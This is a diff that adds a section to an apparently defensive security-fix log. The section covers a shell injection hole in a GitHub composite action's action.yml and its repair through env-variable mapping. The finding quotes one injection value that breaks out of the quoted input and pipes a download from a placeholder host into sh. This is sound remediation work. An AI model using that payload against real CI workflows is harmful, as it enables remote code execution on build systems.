@@ -321,3 +321,21 @@ Note on the enum sub-item: the finding says "graph does not" have a test asserti
 this sub-item was already satisfied.
 
 Tests added: `test_critique_schema_forbids_additional_properties`, `test_graph_schema_forbids_additional_properties`.
+
+### 2.4 action.yml interpolates inputs into bash
+
+Finding: every `${{ inputs.* }}` expanded inside the composite action's `run:` block, so a value like
+`version: 1.0" ; curl evil | sh ; echo "` broke out of the shell.
+
+FIX (files touched):
+- `action.yml`: added an `env:` block mapping each input to an `INPUT_*` variable; the `run:` block now
+  references `"$INPUT_*"` shell env vars, whose values are never spliced into the script source.
+  Also pinned `actions/setup-python` to a SHA here (see 2.6).
+
+BEFORE / AFTER (grep of the run block):
+```
+run: | at line 146
+OK: no ${{ interpolation anywhere after run: |
+```
+`grep '${{ inputs.'` now matches only the `env:` mapping lines (the safe form), never the run block.
+`action.yml` parses as valid YAML; behavior is identical (same flags built from the same inputs).
